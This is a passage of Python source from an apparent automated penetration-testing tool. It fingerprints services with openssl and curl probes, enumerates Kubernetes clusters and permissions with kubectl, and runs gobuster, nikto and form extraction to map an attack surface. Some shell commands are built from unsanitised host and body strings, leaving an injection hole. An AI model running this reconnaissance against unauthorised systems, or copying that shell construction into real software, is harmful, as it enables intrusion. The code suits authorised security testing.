        # nmap cannot fingerprint etcd (0 entries in service-probes).
        # Two-phase identification: (1) openssl CN for TLS services,
        # (2) HTTP GET to /version for plain-HTTP API services.
        #
        # Known API fingerprints — add new services here as needed.
        # Each entry: (path, response_substring, service_name, proto)
        # API fingerprints: (path, needle, service_name, proto, method, post_body)
        # method and post_body are optional — defaults to GET with no body.
        _API_FINGERPRINTS: list[tuple] = [
            ("/version", '"etcdserver"', "etcd", "etcd", "GET", ""),
            ("/version", '"etcdcluster"', "etcd", "etcd", "GET", ""),
            ("/health", '{"health":"true"}', "etcd", "etcd", "GET", ""),
            # K8s admission webhook: POST /validate with minimal AdmissionReview.
            # A response (even an error) means this is a K8s admission controller
            # — pure TLS services or generic HTTPS servers return nothing or 404.
            ("/validate", "admission", "kubernetes-admission",
             "kubernetes", "POST",
             '{"apiVersion":"admission.k8s.io/v1","kind":"AdmissionReview","request":{"uid":"probe"}}'),
            # S3-compatible object storage API probes.
            # MinIO and other S3-compatible services expose REST paths.
            ("/minio/webrpc", "minio", "minio-s3", "s3", "GET", ""),
            ("/bucket", '"objects"', "s3-api", "s3", "GET", ""),
            ("/v1/objects", '"objects"', "s3-api", "s3", "GET", ""),
        ]

        for p in discovered_ports:
            _svc = (p.get("service", "") or "").lower()
            if "unknown" not in _svc and "tcpwrapped" not in _svc:
                continue
            _port = p["port"]
            _identified = False

            # Phase 1: TLS cert field extraction (works for HTTPS services)
            # Extracts CN, O, OU from the subject line and Subject
            # Alternative Names.  Matches against a broader keyword set
            # than just etcd/k8s — ingress-nginx admission controllers
            # use minimal test certs (O=nil2) but other deployments may
            # have identifiable fields.
            try:
                proc = await asyncio.create_subprocess_shell(
                    f"echo '' | openssl s_client -connect {host}:{_port} "
                    f"-servername {host} 2>&1",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=8)
                out = stdout.decode("utf-8", errors="replace")
                # Extract all cert identity: CN, O, OU, and the full subject line
                cn_match = re.search(r"\bCN\s*=\s*(\S+)", out)
                cn = cn_match.group(1) if cn_match else ""
                o_match = re.search(r"\bO\s*=\s*(\S+)", out)
                org = o_match.group(1) if o_match else ""
                # Subject line for broader matching
                subj_match = re.search(r"subject\s*=\s*(.+?)(?:\n|$)", out)
                subj = subj_match.group(1) if subj_match else ""
                _cert_text = f"{cn} {org} {subj}".lower()
                _name = ""
                if "etcd" in _cert_text:
                    _name = "etcd"
                elif any(kw in _cert_text for kw in ("k8s", "kubernetes")):
                    _name = "kubernetes"
                elif any(kw in _cert_text for kw in ("ingress", "nginx")):
                    _name = "ingress-nginx"
                if _name:
                    self.dkg.add_node("Service",
                        f"svc-{host}-{_port}", {
                            "port": _port, "protocol": "tcp",
                            "version": _name, "service_name": _name,
                            "banner": f"CN={cn}",
                    })
                    self.dkg.add_node("Endpoint",
                        f"endpoint-{host}-{_port}-{_name}", {
                            "url": f"https://{host}:{_port}",
                            "method": "GET", "params": "",
                            "proto": _name,
                            "discovered_by": "bootstrap-openssl",
                    })
                    log.info("openssl s_client cert=%s → identified as %s on port %d",
                             cn, _name, _port)
                    _identified = True
            except Exception:
                pass

            # Phase 2: HTTP API probe for unknown services (both HTTP
            # and HTTPS — tries HTTPS first for TLS ports, HTTP fallback).
            # Uses GET by default; POST with JSON body for endpoints
            # like K8s admission webhooks that only respond to POST.
            if not _identified:
                for _path, _needle, _svc_name, _proto, _method, _post_body in _API_FINGERPRINTS:
                    try:
                        _method_flag = "-X POST" if _method == "POST" else ""
                        _body_flag = f"-H 'Content-Type: application/json' -d '{_post_body}'" if _post_body else ""
                        _url = f"https://{host}:{_port}{_path}"
                        proc = await asyncio.create_subprocess_shell(
                            f"curl -sk --connect-timeout 3 {_method_flag} {_body_flag} '{_url}' 2>&1",
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                        )
                        stdout, _ = await asyncio.wait_for(
                            proc.communicate(), timeout=5)
                        _body = stdout.decode("utf-8", errors="replace")
                        # POST probes match on HTTP success (server responded)
                        # rather than body content — admission webhooks return
                        # 500 with empty body for invalid AdmissionReviews.
                        _match = (proc.returncode == 0) if _method == "POST" else (_needle in _body)
                        if _match:
                            self.dkg.add_node("Service",
                                f"svc-{host}-{_port}", {
                                    "port": _port, "protocol": "tcp",
                                    "version": _svc_name,
                                    "service_name": _svc_name,
                                    "banner": _body[:200],
                            })
                            self.dkg.add_node("Endpoint",
                                f"endpoint-{host}-{_port}-{_proto}", {
                                    "url": f"https://{host}:{_port}",
                                    "method": "GET", "params": "",
                                    "proto": _proto,
                                    "discovered_by": "bootstrap-api-probe",
                            })
                            log.info("API probe %s → identified as %s on port %d",
                                     _path, _svc_name, _port)
                            _identified = True
                            break
                    except Exception:
                        continue

        # Probe HTTP ports discovered by nmap (parallel)
        # Exclude SSH, AD, and DB ports (not HTTP)
        _NON_HTTP_PORTS = {"22", "445", "389", "636", "3268", "3269",
                           "3306", "5432", "6379", "1433", "1521", "27017"}
        # Also exclude by service name to catch non-standard ports
        _NON_HTTP_SVC_NAMES = {"ssh", "redis", "mysql", "mariadb", "postgresql",
                               "mssql", "oracle", "mongodb", "memcached",
                               "ldap", "kerberos", "smb", "rdp", "vnc"}
        http_ports = []
        for p in discovered_ports:
            p_str = str(p.get("port"))
            if p_str in _NON_HTTP_PORTS:
                continue
            svc = (p.get("service", "") or p.get("version", "")).lower()
            if any(name in svc for name in _NON_HTTP_SVC_NAMES):
                continue
            http_ports.append(p)

        async def _probe_one_port(port: int) -> tuple:
            """Probe a single HTTP port, return (url, stdout, http_status, technologies, forms, api_paths)."""
            scheme = "https" if port in {443, 8443} else "http"
            url = f"{scheme}://{host}:{port}"
            is_tls = scheme == "https"
            try:
                curl_result = await self.recon_gateway.call("curl_get",
                    {"url": url, "follow_redirects": True,
                     "insecure": True if is_tls else False})
                if not curl_result.success and is_tls:
                    url = f"http://{host}:{port}"
                    curl_result = await self.recon_gateway.call("curl_get",
                        {"url": url, "follow_redirects": True})
                if not curl_result.success:
                    return (url, "", 0, [], [], [])
                stdout = getattr(curl_result, "stdout", "")
                resp_len = len(stdout)
                http_status = 200
                first_line = stdout.split("\n")[0] if stdout else ""
                if first_line.startswith("HTTP/"):
                    parts = first_line.split()
                    if len(parts) >= 2 and parts[1].isdigit():
                        http_status = int(parts[1])
                # Parse response
                forms = []
                api_paths = []
                parse_sample = stdout[:50000]
                if resp_len > 100000:
                    parse_sample += stdout[-10000:]
                try:
                    parse_result = await self.recon_gateway.call("response_parse",
                        {"content": parse_sample})
                    if parse_result.success:
                        parsed = getattr(parse_result, "parsed_output", {})
                        forms = parsed.get("forms", [])
                except Exception:
                    pass
                # Extract API paths from large JS bundles
                if resp_len > 100000:
                    import re as _re
                    for pattern in [r'["\x27](/api/[^"\x27]{2,60})["\x27]',
                                   r'fetch\(["\x27](/[^"\x27]{2,60})["\x27]\)']:
                        for m in _re.finditer(pattern, stdout[:200000]):
                            path = m.group(1)
                            if not path.endswith(('.js', '.css', '.png', '.ico')):
                                api_paths.append(path)
                # whatweb
                technologies = []
                try:
                    ww = await self.recon_gateway.call("whatweb_scan",
                        {"target_url": url})
                    if ww.success:
                        technologies = getattr(ww, "parsed_output", {}).get("technologies", [])
                except Exception:
                    pass
                return (url, stdout, http_status, technologies, forms, api_paths)
            except Exception:
                return (url, "", 0, [], [], [])

        # Run all port probes in parallel
        probe_tasks = [asyncio.create_task(_probe_one_port(p["port"])) for p in http_ports]
        probe_results = await asyncio.gather(*probe_tasks, return_exceptions=True)

        # Collect API paths to probe in a second pass
        api_endpoints_to_probe: list[str] = []
        for result in probe_results:
            if isinstance(result, Exception):
                continue
            url, stdout, http_status, technologies, forms, api_paths = result
            if not stdout:
                continue
            resp_len = len(stdout)
            self.dkg.add_node("Endpoint", f"ep-{url}", {
                "url": url, "method": "GET", "params": "",
                "sample_status": http_status,
                "sample_response": stdout[:5000],
                "response_size": resp_len,
                "discovered_by": "bootstrap",
            })
            for form in forms:
                action = form.get("action", "")
                form_url = (action if action.startswith("http")
                            else f"{url.rstrip('/')}/{action.lstrip('/')}")
                params = ",".join(i.get("name", "") for i in form.get("inputs", []))
                self.dkg.add_node("Endpoint", f"ep-form-{form_url[:40]}", {
                    "url": form_url, "method": form.get("method", "POST"),
                    "params": params, "body_format": "form",
                    "discovered_by": "bootstrap",
                })
            # ── When root is near-empty, probe common paths for real content ──
            if resp_len < 500 and len(discovered_ports) <= 3:
                _WEB_PATHS = ["/", "/index.html", "/home", "/login", "/admin",
                              "/api", "/app", "/status", "/health", "/metrics",
                              "/fetch", "/upload", "/dashboard", "/console",
                              "/files", "/objects", "/buckets"]
                async def _probe_web_path(path: str):
                    try:
                        r = await self.recon_gateway.call("curl_get",
                            {"url": f"{url.rstrip('/')}{path}", "follow_redirects": True})
                        if r.success:
                            out = getattr(r, "stdout", "")
                            if len(out) > 200:
                                self.dkg.add_node("Endpoint", f"ep-path-{path.replace('/','-')[:30]}", {
                                    "url": f"{url.rstrip('/')}{path}", "method": "GET",
                                    "params": "",
                                    "sample_status": 200, "sample_response": out[:5000],
                                    "response_size": len(out),
                                    "discovered_by": "bootstrap-path-probe",
                                })
                    except Exception:
                        pass
                path_tasks = [asyncio.create_task(_probe_web_path(p))
                              for p in _WEB_PATHS]
                await asyncio.gather(*path_tasks, return_exceptions=True)

            if technologies:
                log.info("bootstrap whatweb: %s → %s", url, technologies)
                # Enrich the existing nmap Service node with whatweb
                # fingerprint data instead of creating fake tech-* nodes.
                from urllib.parse import urlparse as _up2
                _p = _up2(url)
                _svc_port = _p.port or (443 if _p.scheme == "https" else 80)
                _svc_id = f"svc-{host}-{_svc_port}"
                _existing = self.dkg.get_node(_svc_id)
                if _existing:
                    self.dkg.update_node(_svc_id, {
                        "fingerprint": technologies,
                    })
            for path in api_paths[:20]:
                api_endpoints_to_probe.append(f"{url.rstrip('/')}{path}")

        # Second pass: probe discovered API paths (also parallel)
        probed_apis: set[str] = set()
        async def _probe_api_path(ep_url: str):
            if ep_url in probed_apis:
                return
            probed_apis.add(ep_url)
            try:
                r = await self.recon_gateway.call("curl_get",
                    {"url": ep_url, "follow_redirects": True})
                if r.success:
                    out = getattr(r, "stdout", "")
                    st = 200
                    fl = out.split("\n")[0] if out else ""
                    if fl.startswith("HTTP/"):
                        pts = fl.split()
                        if len(pts) >= 2 and pts[1].isdigit():
                            st = int(pts[1])
                    self.dkg.add_node("Endpoint", f"ep-api-{ep_url[:50]}", {
                        "url": ep_url, "method": "GET", "params": "",
                        "sample_status": st, "sample_response": out[:5000],
                        "response_size": len(out),
                        "discovered_by": "bootstrap-api-probe",
                    })
            except Exception:
                pass

        if api_endpoints_to_probe:
            api_tasks = [asyncio.create_task(_probe_api_path(u))
                         for u in api_endpoints_to_probe[:30]]
            await asyncio.gather(*api_tasks, return_exceptions=True)

        # Wait for K8S cluster discovery (launched in parallel with nmap)
        try:
            await k8s_discovery_task
        except Exception:
            pass  # K8S discovery failure is non-fatal

        # CTAGE: Cloud Topology & Attack Graph Engine — extend K8s discovery
        # with RBAC mapping, pod security analysis, and IAM enumeration.
        try:
            from darwin.cloud_topology import discover_cloud_topology
            self._cloud_topology = await discover_cloud_topology(self.dkg)
            log.info("CTAGE: cloud topology mapped — %d pods, %d RBAC bindings, %d IAM roles",
                     len(self._cloud_topology.pods) if self._cloud_topology else 0,
                     len(self._cloud_topology.rbac_bindings) if self._cloud_topology else 0,
                     len(self._cloud_topology.iam_roles) if self._cloud_topology else 0)
            if self._cloud_topology and self._cloud_topology.high_risk_pods:
                log.info("CTAGE: %d high-risk pods identified", len(self._cloud_topology.high_risk_pods))
                for profile in self._cloud_topology.high_risk_pods[:5]:
                    log.info("  CTAGE high-risk: %s/%s risk=%.2f vectors=%s",
                             profile.namespace, profile.pod_name,
                             profile.risk_score, profile.escape_vectors)
        except Exception as e:
            log.debug("CTAGE: cloud topology mapping skipped (%s)", e)

        self._discovered_ports = discovered_ports

        # ── Bootstrap summary ─────────────────────────────────────────
        services = self.dkg.query_nodes("Service")
        hosts = self.dkg.query_nodes("Host")
        domains = self.dkg.query_nodes("Domain")
        db_ports = {3306: "MySQL", 5432: "PostgreSQL", 6379: "Redis",
                    1433: "MSSQL", 1521: "Oracle", 27017: "MongoDB"}
        db_found = []
        for s in services:
            p = s.get("port")
            if p in db_ports:
                db_found.append(f"port {p} ({db_ports[p]})")

        print(f"\n[BOOTSTRAP] {len(hosts)} host(s), {len(services)} service(s)")
        for s in services:
            ver = s.get("version", "") or s.get("banner", "")
            print(f"  port {s.get('port'):>5}/{s.get('protocol','tcp'):<6} {ver[:55]}")
        if db_found:
            print(f"  Non-HTTP services: {', '.join(db_found)}")
        if domains:
            print(f"  Domain detected: {domains[0].get('name', '?')} (ports 389/445/636)")
        ssh_ok = any(s.get("port") == 22 and not s.get("skip_exploit", True)
                     for s in services)
        if ssh_ok:
            print(f"  SSH: credentials active")
        if self._provided_username and not ssh_ok:
            db_creds = [c for c in self.dkg.query_nodes("Credential")
                       if c.get("source") == "user_provided" and c.get("cred_type") != "ssh"]
            if db_creds:
                cred_parts = [f"{c.get('cred_type','?')}:{c.get('port','?')}" for c in db_creds]
                print(f"  DB credentials provided for: {', '.join(cred_parts)}")

        self.step_count += 1

    # ── K8s Cluster Discovery (runs in parallel with nmap) ─────────

    async def _k8s_cluster_discovery(self) -> None:
        """Discover local K8S cluster topology independently of nmap.

        Runs kubectl commands to enumerate nodes, pods, services, and
        namespaces. Populates DKG with Host/Service/Endpoint/Analysis
        nodes for discovered cluster resources. This is critical for
        KIND-based scenarios where only the API server port is mapped
        to localhost and the rest of the cluster is invisible to nmap.

        Runs unconditionally — if kubectl is unavailable or no cluster
        exists, fails silently in <2s. All commands have 8s timeouts.
        """
        import json as _json

        # ── Step 1: Verify kubectl is available and a cluster is reachable ──
        try:
            proc = await asyncio.create_subprocess_shell(
                "kubectl cluster-info 2>&1",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=8)
            out = stdout.decode("utf-8", errors="replace")
            if proc.returncode != 0 or "is running at" not in out:
                return  # No K8S cluster available or kubectl not installed
            api_match = re.search(r"is running at (https?://\S+)", out)
            api_url = api_match.group(1) if api_match else ""
            log.info("K8S cluster discovery: cluster reachable at %s", api_url)
        except Exception:
            return

        # ── Step 2: Enumerate nodes (name, IP, labels, taints) ──
        nodes_data: dict = {}
        try:
            proc = await asyncio.create_subprocess_shell(
                "kubectl get nodes -o json 2>&1",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=8)
            out = stdout.decode("utf-8", errors="replace")
            if proc.returncode == 0:
                nodes_data = _json.loads(out) if out.strip().startswith("{") else {}
        except Exception:
            pass

        k8s_nodes: list[dict] = []
        for item in nodes_data.get("items", []):
            meta = item.get("metadata", {})
            status = item.get("status", {})
            node_info: dict = {
                "name": meta.get("name", ""),
                "labels": meta.get("labels", {}),
                "taints": [],
                "is_control_plane": False,
                "internal_ip": "",
            }
            # Extract node IP
            for addr in status.get("addresses", []):
                if addr.get("type") == "InternalIP":
                    node_info["internal_ip"] = addr.get("address", "")
                    break
            # Extract taints
            for taint in item.get("spec", {}).get("taints", []):
                node_info["taints"].append(
                    f"{taint.get('key','')}={taint.get('value','')}:{taint.get('effect','')}"
                )
            # Detect control-plane role
            for label in node_info["labels"]:
                if "control-plane" in label or label == "node-role.kubernetes.io/master":
                    node_info["is_control_plane"] = True
            k8s_nodes.append(node_info)

        # ── Step 3: Enumerate pods (name, namespace, node, labels, status) ──
        pods_data: dict = {}
        try:
            proc = await asyncio.create_subprocess_shell(
                "kubectl get pods -A -o json 2>&1",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=8)
            out = stdout.decode("utf-8", errors="replace")
            if proc.returncode == 0:
                pods_data = _json.loads(out) if out.strip().startswith("{") else {}
        except Exception:
            pass

        k8s_pods: list[dict] = []
        for item in pods_data.get("items", []):
            meta = item.get("metadata", {})
            spec = item.get("spec", {})
            k8s_pods.append({
                "name": meta.get("name", ""),
                "namespace": meta.get("namespace", ""),
                "node_name": spec.get("nodeName", ""),
                "labels": meta.get("labels", {}),
                "phase": item.get("status", {}).get("phase", "Unknown"),
                "containers": [
                    c.get("image", "") for c in spec.get("containers", [])
                ],
            })

        # ── Step 4: Enumerate services (name, namespace, clusterIP, ports) ──
        svcs_data: dict = {}
        try:
            proc = await asyncio.create_subprocess_shell(
                "kubectl get svc -A -o json 2>&1",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=8)
            out = stdout.decode("utf-8", errors="replace")
            if proc.returncode == 0:
                svcs_data = _json.loads(out) if out.strip().startswith("{") else {}
        except Exception:
            pass

        k8s_svcs: list[dict] = []
        for item in svcs_data.get("items", []):
            meta = item.get("metadata", {})
            spec = item.get("spec", {})
            ports = spec.get("ports", [])
            k8s_svcs.append({
                "name": meta.get("name", ""),
                "namespace": meta.get("namespace", ""),
                "cluster_ip": spec.get("clusterIP", ""),
                "ports": [{"port": p.get("port", 0), "protocol": p.get("protocol", "TCP"),
                           "target_port": p.get("targetPort", "")} for p in ports],
                "selector": spec.get("selector", {}),
                "type": spec.get("type", "ClusterIP"),
            })

        # ── Step 5: Enumerate namespaces ──
        ns_list: list[str] = []
        try:
            proc = await asyncio.create_subprocess_shell(
                "kubectl get namespaces -o json 2>&1",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=8)
            out = stdout.decode("utf-8", errors="replace")
            if proc.returncode == 0 and out.strip().startswith("{"):
                ns_data = _json.loads(out)
                ns_list = [i.get("metadata", {}).get("name", "")
                           for i in ns_data.get("items", [])]
        except Exception:
            pass

        # ── Step 6: Check current permissions ──
        permissions: list[str] = []
        try:
            proc = await asyncio.create_subprocess_shell(
                "kubectl auth can-i --list -A 2>&1 | head -60",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=8)
            out = stdout.decode("utf-8", errors="replace")
            if proc.returncode == 0:
                for line in out.split("\n"):
                    line = line.strip()
                    if line and not line.startswith("Resources") and "yes" in line.lower():
                        permissions.append(line)
        except Exception:
            pass

        # ── Write DKG nodes ───────────────────────────────────────────

        # Host nodes for each K8S node
        for node in k8s_nodes:
            node_id = f"host-k8s-{node['name']}"
            self.dkg.add_node("Host", node_id, {
                "ip": node["internal_ip"] or node["name"],
                "is_reachable": True,
                "is_internal": True,
                "k8s_node_name": node["name"],
                "k8s_node_labels": node["labels"],
                "k8s_node_taints": node["taints"],
                "is_control_plane": node["is_control_plane"],
                "discovered_by": "k8s-cluster-discovery",
            })

        # Endpoint for the K8S API server
        if api_url:
            self.dkg.add_node("Endpoint", f"endpoint-k8s-api", {
                "url": api_url,
                "method": "GET",
                "params": "",
                "proto": "kubernetes",
                "discovered_by": "k8s-cluster-discovery",
            })

        # Service nodes for each K8S service (ClusterIP only)
        for svc in k8s_svcs:
            for port_info in svc["ports"]:
                svc_id = f"svc-k8s-{svc['namespace']}-{svc['name']}-{port_info['port']}"
                self.dkg.add_node("Service", svc_id, {
                    "port": port_info["port"],
                    "protocol": port_info["protocol"].lower(),
                    "service_name": f"k8s-{svc['name']}",
                    "version": f"ClusterIP {svc['cluster_ip']}:{port_info['port']}",
                    "banner": f"K8s Service {svc['name']}.{svc['namespace']}.svc.cluster.local",
                    "k8s_namespace": svc["namespace"],
                    "k8s_cluster_ip": svc["cluster_ip"],
                    "k8s_selector": svc["selector"],
                    "discovered_by": "k8s-cluster-discovery",
                })

        # Analysis node with cluster summary
        analysis_parts: list[str] = []
        analysis_parts.append(f"K8S cluster discovered with {len(k8s_nodes)} node(s)")
        for node in k8s_nodes:
            role = "control-plane" if node["is_control_plane"] else "worker"
            label_str = ", ".join(
                f"{k}={v}" for k, v in node["labels"].items()
                if k not in ("kubernetes.io/hostname", "kubernetes.io/os",
                             "kubernetes.io/arch", "beta.kubernetes.io/os",
                             "beta.kubernetes.io/arch", "node.kubernetes.io/instance-type")
            )
            analysis_parts.append(
                f"  Node {node['name']} ({role}): IP={node['internal_ip']}, labels={{ {label_str} }}"
            )
            if node["taints"]:
                analysis_parts.append(f"    taints: {', '.join(node['taints'])}")

        if k8s_pods:
            analysis_parts.append(f"{len(k8s_pods)} pod(s) running:")
            for pod in k8s_pods[:20]:
                analysis_parts.append(
                    f"  {pod['namespace']}/{pod['name']} [{pod['phase']}] "
                    f"on {pod['node_name']} images={pod['containers']}"
                )

        if k8s_svcs:
            analysis_parts.append(f"{len(k8s_svcs)} service(s):")
            for svc in k8s_svcs[:20]:
                port_str = ", ".join(
                    f"{p['port']}/{p['protocol']}" for p in svc["ports"]
                )
                analysis_parts.append(
                    f"  {svc['namespace']}/{svc['name']} "
                    f"type={svc['type']} clusterIP={svc['cluster_ip']} ports={port_str}"
                )

        if ns_list:
            analysis_parts.append(f"Namespaces: {', '.join(ns_list)}")

        if permissions:
            analysis_parts.append(f"Current permissions ({len(permissions)} allowed):")
            for perm in permissions[:20]:
                analysis_parts.append(f"  {perm}")

        if analysis_parts:
            self.dkg.add_node("Analysis", "analysis-k8s-cluster", {
                "content": "\n".join(analysis_parts),
                "source": "k8s-cluster-discovery",
                "phase": "analyze",
            })

        total_nodes = len(k8s_nodes)
        total_pods = len(k8s_pods)
        total_svcs = len(k8s_svcs)
        log.info(
            "K8S cluster discovery: %d nodes, %d pods, %d services, %d namespaces",
            total_nodes, total_pods, total_svcs, len(ns_list),
        )
        print(f"\n[K8S DISCOVERY] {total_nodes} node(s), {total_pods} pod(s), "
              f"{total_svcs} service(s), {len(ns_list)} namespace(s)")

    # ── Deep Recon (after bootstrap, before service research) ───────

    async def _deep_recon(self) -> None:
        """Deep reconnaissance on discovered HTTP endpoints.

        Runs after bootstrap (which only probes root URLs) and before
        service_research/analyze. Uses dirb, nikto, and form_extract to
        discover the full attack surface: directories, known vulns, forms.
        """
        endpoints = self.dkg.query_nodes("Endpoint")
        if not endpoints:
            return
        log.info("_deep_recon: scanning %d endpoints", len(endpoints))

        async def _probe_one(endpoint: dict):
            url = endpoint.get("url", "")
            ep_id = endpoint.get("id", "") or f"ep-{url[:50]}"
            if not url or not url.startswith("http"):
                return
            resp_len = endpoint.get("response_size", 0)
            sample = endpoint.get("sample_response", "")
            if "403 Forbidden" in sample or "connection refused" in sample.lower():
                return

            scanned = False

            # Fork based on response type (from bootstrap response_parse)
            if resp_len > 1000000:
                # SPA / large JS bundle — dirb/nikto useless.
                # Probe API paths already extracted by bootstrap.
                api_eps = [e for e in self.dkg.query_nodes("Endpoint")
                           if e.get("discovered_by", "").startswith("bootstrap-api-")
                           and e.get("url", "").startswith(url)]
                for api_ep in api_eps[:15]:
                    api_url = api_ep.get("url", "")
                    try:
                        r = await self.recon_gateway.call("curl_get",
                            {"url": api_url, "follow_redirects": True})
                        if r.success:
                            out = getattr(r, "stdout", "")
                            st = 200
                            fl = out.split("\n")[0] if out else ""
                            if fl.startswith("HTTP/"):
                                pts = fl.split()
                                if len(pts) >= 2 and pts[1].isdigit():
                                    st = int(pts[1])
                            self.dkg.add_node("Endpoint", f"ep-probe-{api_url[:50]}", {
                                "url": api_url, "method": "GET", "params": "",
                                "sample_status": st, "sample_response": out[:5000],
                                "response_size": len(out),
                                "discovered_by": "deep-recon-api-probe",
                            })
                            if 0 < len(out) < 100000:
                                rp = await self.recon_gateway.call("response_parse",
                                    {"content": out[:50000]})
                                if rp.success:
                                    parsed = getattr(rp, "parsed_output", {})
                                    for form in parsed.get("forms", []):
                                        _add_form_endpoint(form, url)
                    except Exception:
                        pass
                scanned = True

            elif resp_len < 500000:
                # Small/medium HTML page — full recon: gobuster + nikto + form_extract
                # Threshold raised from 200K to 500K to cover medium pages (200-500KB)
                # that previously fell into a gap and received no recon at all.
                # Only run expensive tools on primary HTTP endpoints discovered
                # by nmap or bootstrap whatweb. Skip derived/internal endpoints
                # (API probes, path probes, deep recon follow-ups, simulators)
                # that don't have directory structures to brute-force.
                _disc = endpoint.get("discovered_by", "")
                _is_primary = (
                    _disc == "bootstrap-nmap"      # nmap-discovered port
                    or _disc == "bootstrap"         # bootstrap whatweb on primary port
                    or _disc == ""                  # legacy endpoint without tag
                )
                if not _is_primary:
                    log.info("_deep_recon: skipping non-primary endpoint %s (discovered_by=%s)", url, _disc)
                    return  # skip gobuster/nikto/form for derived endpoints
                # Skip gobuster on REST API / JSON endpoints — these don't have
                # directory structures to brute-force. A JSON response means
                # this is a programmatic API, not a directory-browsable web app.
                _sample = endpoint.get("sample_response", "")
                if _sample.strip().startswith("{") or _sample.strip().startswith("["):
                    log.info("_deep_recon: skipping JSON/API endpoint %s", url)
                    return

                # Pre-flight curl check: verify the endpoint is reachable and
                # returns HTML (not JSON/empty) before running gobuster.
                # IMDS/S3 simulators and other non-directory HTTP services
                # timeout gobuster (90s+retry=225s per endpoint).
                try:
                    _pre = await self.recon_gateway.call("curl_get", {
                        "url": url, "method": "GET", "timeout": "5",
                    })
                    _pre_stdout = getattr(_pre, "stdout", "") or ""
                    if not _pre.success or not _pre_stdout.strip():
                        log.info("_deep_recon: pre-flight unreachable, skipping gobuster/nikto for %s", url)
                        return
                    if _pre_stdout.strip().startswith("{") or _pre_stdout.strip().startswith("["):
                        log.info("_deep_recon: pre-flight JSON/API, skipping gobuster/nikto for %s", url)
                        return
                    # Non-HTML response detection: plain-text APIs (IMDS,
                    # cloud simulators, etc.) return content without HTML
                    # tags.  gobuster/nikto are directory brute-forcers that
                    # only make sense for HTML web apps.
                    _body = _pre_stdout.strip()
                    _is_html = (
                        _body.startswith("<")
                        or "<!DOCTYPE" in _body[:200]
                        or "</" in _body
                    )
                    if not _is_html and len(_body) < 500:
                        log.info("_deep_recon: pre-flight non-HTML (plain text/API), "
                                 "skipping gobuster/nikto for %s", url)
                        return
                except Exception:
                    # If pre-flight itself fails, skip heavy tools
                    log.info("_deep_recon: pre-flight failed, skipping gobuster/nikto for %s", url)
                    return

                try:
                    bust_result = await self.recon_gateway.call("gobuster_dir",
                        {"target_url": url})
                    scanned = True
                    if bust_result.success:
                        paths = getattr(bust_result, "parsed_output", {}).get("discovered_paths", [])
                        for pi in paths[:15]:
                            path = pi.get("path", "")
                            if path:
                                ep_url = f"{url.rstrip('/')}{path}"
                                self.dkg.add_node("Endpoint", f"ep-dirb-{path[:40]}", {
                                    "url": ep_url, "method": "GET", "params": "",
                                    "sample_status": pi.get("code", 200),
                                    "discovered_by": "deep-recon-dirb",
                                })
                except Exception:
                    pass
                try:
                    nikto_result = await self.recon_gateway.call("nikto_scan",
                        {"target_url": url})
                    if nikto_result.success:
                        findings = getattr(nikto_result, "stdout", "")
                        if findings and "0 items" not in findings:
                            for line in findings.split("\n")[:10]:
                                line = line.strip()
                                if line and "OSVDB" not in line:
                                    self.dkg.add_node("Vulnerability", f"vuln-nikto-{len(line[:20])}", {
                                        "vuln_type": "XSS", "endpoint": url,
                                        "parameter": "", "severity": "low",
                                        "source": "nikto", "detail": line[:200],
                                    })
                except Exception:
                    pass
                try:
                    form_result = await self.recon_gateway.call("form_extract",
                        {"url": url})
                    if form_result.success:
                        parsed = getattr(form_result, "parsed_output", {})
                        for form in parsed.get("forms", []):
                            _add_form_endpoint(form, url)
                except Exception:
                    pass

            elif "json" in sample.lower() or sample.strip().startswith("{"):
                # JSON/API response — curl + response_parse to extract structure
                try:
                    rp = await self.recon_gateway.call("response_parse",
                        {"content": sample[:50000]})
                    if rp.success:
                        parsed = getattr(rp, "parsed_output", {})
                        for key in parsed.get("keys", [])[:10]:
                            probe_url = f"{url.rstrip('/')}/{key}"
                            r2 = await self.recon_gateway.call("curl_get",
                                {"url": probe_url, "follow_redirects": True})
                            if r2.success:
                                out = getattr(r2, "stdout", "")
                                self.dkg.add_node("Endpoint", f"ep-api-{key[:40]}", {
                                    "url": probe_url, "method": "GET", "params": "",
                                    "sample_status": 200, "sample_response": out[:5000],
                                    "discovered_by": "deep-recon-json-probe",
                                })
                    scanned = True
                except Exception:
                    pass

            else:
                # Medium/large HTML page (500KB-1MB) that isn't JSON/SPA.
                # Too large for full dirb/nikto but still likely has forms and
                # important content.  At minimum: run form_extract.
                try:
                    form_result = await self.recon_gateway.call("form_extract",
                        {"url": url})
                    if form_result.success:
                        parsed = getattr(form_result, "parsed_output", {})
                        for form in parsed.get("forms", []):
                            _add_form_endpoint(form, url)
                    scanned = True
                except Exception:
                    pass

            # Mark scanned to prevent redundant agent work
            if scanned:
                self.dkg.add_node("Endpoint", ep_id, {
                    "url": url, "deep_recon_done": True,
                    "discovered_by": "deep-recon",
                })

        def _add_form_endpoint(form: dict, base_url: str):
            action = form.get("action", "")
            form_url = (action if action.startswith("http")
                        else f"{base_url.rstrip('/')}/{action.lstrip('/')}")
            params = ",".join(i.get("name", "") for i in form.get("inputs", []))
            if params:
                self.dkg.add_node("Endpoint", f"ep-form-{form_url[:40]}", {
                    "url": form_url, "method": form.get("method", "POST"),
                    "params": params, "body_format": "form",
                    "discovered_by": "deep-recon-form",
                })

        # CMS entry-point auto-probe (after endpoint scanning, before deep recon)
        _CMS_PATHS = [
            "/wp-admin/", "/wp-login.php", "/wp-content/", "/wp-content/plugins/",
            "/wp-json/wp/v2/", "/administrator/", "/user/login",
